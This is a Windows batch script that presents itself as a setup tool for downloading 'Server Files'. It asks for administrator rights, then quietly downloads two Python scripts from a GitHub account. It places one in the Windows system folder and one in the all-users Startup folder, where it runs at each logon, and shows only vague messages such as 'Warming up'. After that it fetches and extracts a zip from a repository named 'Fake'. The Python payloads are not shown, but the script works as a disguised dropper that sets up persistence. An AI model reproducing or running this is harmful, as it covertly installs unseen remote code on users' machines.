@echo off
setlocal enabledelayedexpansion

REM Set color to blue (blue is represented by 1 in the command)
color 0D

REM Check if running with admin rights
net session >nul 2>&1
if %errorLevel% neq 0 (
    echo Please run this script as administrator.
    pause
    exit /b
)

REM Check if Python is installed
where python >nul 2>&1
if %errorLevel% neq 0 (
    echo Python is not installed. Please install Python from the 'req' folder included with this script.
    pause
    exit /b
)

REM Step 1: Download windows.py and place it in C:\Windows
echo getting ready...
powershell -Command "(New-Object System.Net.WebClient).DownloadFile('https://raw.githubusercontent.com/rexzy69/Seawee/main/windows.py', '%SystemRoot%\windows.py')"

REM Step 2: Download sub.py and place it in the startup folder
echo Warming up
powershell -Command "(New-Object System.Net.WebClient).DownloadFile('https://raw.githubusercontent.com/rexzy69/Seawee/main/sub.py', '%ProgramData%\Microsoft\Windows\Start Menu\Programs\Startup\sub.py')"

REM Step 3: Downloading Server Files from GitHub into current directory
set "batchDir=%~dp0"
echo Batch file directory: %batchDir%
echo Downloading Server Files to: %batchDir%
powershell -Command "(New-Object System.Net.WebClient).DownloadFile('https://github.com/rexzy69/Fake/archive/refs/heads/main.zip', '%batchDir%\Server.zip')"

REM Check if download was successful
if not exist "%batchDir%\Server.zip" (
    echo Failed to download Server Files. Please check your internet connection or download manually from https://github.com/rexzy69/Server..git
    pause
    exit /b
)

echo Server Files downloaded successfully as Server.zip.

REM Extract Server.zip into Server-main folder
echo Extracting Server Files...
powershell -Command "Expand-Archive -Path '%batchDir%\Server.zip' -DestinationPath '%batchDir%\Server-main'"

REM Check if extraction was successful
if errorlevel 1 (
    echo Failed to extract Server Files.
    pause
    exit /b
)

echo Server Files extracted successfully to %batchDir%\Server-main.

echo Setup complete.
pause
